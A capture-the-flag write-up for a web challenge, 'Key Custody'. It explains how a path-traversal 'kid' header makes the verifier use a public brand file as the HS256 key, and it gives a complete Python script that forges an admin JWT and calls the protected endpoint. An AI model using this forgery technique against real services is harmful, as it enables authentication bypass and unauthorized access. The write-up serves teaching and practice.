# Key Custody

> Web · Easy · Chronos Security  
> Points: 120 · Flag submitted by: [JohnG4lt](https://github.com/j0hn-G4lt)

**The flag**

`CSCTF{...}` — a per-team value returned by `/admin/recovery-key` once the forged admin token is
accepted. JohnG4lt holds the credited solve; the route and signing script below are his, and the
per-instance flag string itself was not saved (the instance is now closed).

**Challenge**

A key-custody console issues an HS256 analyst session and serves its brand assets publicly. `GET /token`
hands out the analyst JWT, `GET /schema` is self-describing, and `/public/<name>` serves brand files. The
goal is the admin-only recovery key at `GET /admin/recovery-key`. The challenge name is the hint: the HMAC
signing key is not a hidden secret — it is a file the client can also download.

**Approach**

1. **Read the contract.** `GET /schema` documents that the verifier loads its HS256 key using the JWT
   header's `kid`, and that `/public/{name}` serves public brand assets. `GET /token` issues the analyst
   JWT. Decode its header and payload and keep the existing `sub` claim.
2. **Grab the key file.** Fetch `/public/brand.txt` and keep the exact response bytes, trailing newline
   included — those raw bytes are the HMAC key. (A truncated or newline-stripped copy produces a wrong
   signature, so preserve them verbatim.)
3. **Rewrite the header and payload.** Set the header to
   `{"alg":"HS256","typ":"JWT","kid":"../public/brand.txt"}` and change the issued payload's `role` to
   `admin`. The `../` escapes the key directory the verifier would otherwise constrain the `kid` to, and
   lands on the public brand file.
4. **Sign it.** Base64URL-encode the compact header and payload (no padding), HMAC-SHA-256 the literal
   `<header>.<payload>` string using the raw `brand.txt` bytes as the key, and Base64URL-encode the
   digest (no padding). The signature covers the header — including `kid` — so both header and payload
   must be final before signing.
5. **Send it.** Present the forged token as `Authorization: Bearer <token>` to `GET /admin/recovery-key`.
   This endpoint takes a Bearer header, not a browser cookie.

Manual route (how it was first done): on [jwt.io](https://www.jwt.io/), edit the issued token's header
and `role`, paste the exact `brand.txt` bytes into the HS256 secret field (Base64 option off), and copy
the resulting token into the `Authorization: Bearer` header for `/admin/recovery-key`.

Automated solve (`solve.py`):

```python
import base64, hashlib, hmac, json, urllib.request

base = "<URL>"
get = lambda path: urllib.request.urlopen(base + path).read()
b64 = lambda data: base64.urlsafe_b64encode(data).rstrip(b"=").decode()

issued = json.loads(get("/token"))["token"]
_, part, _ = issued.split(".")
claims = json.loads(base64.urlsafe_b64decode(part + "=" * (-len(part) % 4)))
claims["role"] = "admin"

key = get("/public/brand.txt")                       # raw file bytes = HMAC key
header = b64(json.dumps(
    {"alg": "HS256", "typ": "JWT", "kid": "../public/brand.txt"},
    separators=(",", ":")).encode())
payload = b64(json.dumps(claims, separators=(",", ":")).encode())
message = f"{header}.{payload}"
signature = b64(hmac.new(key, message.encode(), hashlib.sha256).digest())
token = f"{message}.{signature}"

req = urllib.request.Request(base + "/admin/recovery-key",
                             headers={"Authorization": f"Bearer {token}"})
print(urllib.request.urlopen(req).read().decode())
```

**Why it works**

`kid` is supposed to be a key *identifier*, not a path and not a file-inclusion feature. This verifier
uses the attacker-supplied `kid` to build a local key-file path without constraining it to the key
directory, so a `../` component escapes into `/public/` — a local file inclusion in the key-lookup step.
The verifier then opens `/public/brand.txt` and uses its bytes as the HS256 key. Because that file is
public by design, the attacker knows the exact symmetric key and can mint a validly-signed token with any
claims. A symmetric signature only proves the signer knew the key; when the key is a downloadable file,
it proves nothing.

**Validation**

The forged Bearer token was accepted at `/admin/recovery-key` on the live instance, which returned the
challenge flag. The route is fully reproducible with the script above against a fresh instance. The
literal flag string was read from the live response and not recorded in our workspace.
